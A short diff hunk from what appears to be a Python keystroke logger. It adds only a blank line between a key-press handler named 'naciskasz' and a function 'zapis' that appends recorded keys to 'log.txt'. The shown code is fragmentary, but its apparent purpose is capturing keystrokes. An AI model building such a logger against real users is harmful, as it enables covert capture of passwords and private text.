@@ -24,6 +24,7 @@ def naciskasz(key):
     keys = []
 
 
+
 def zapis(keys):
     with open("log.txt", "a") as f:
         for key in keys:
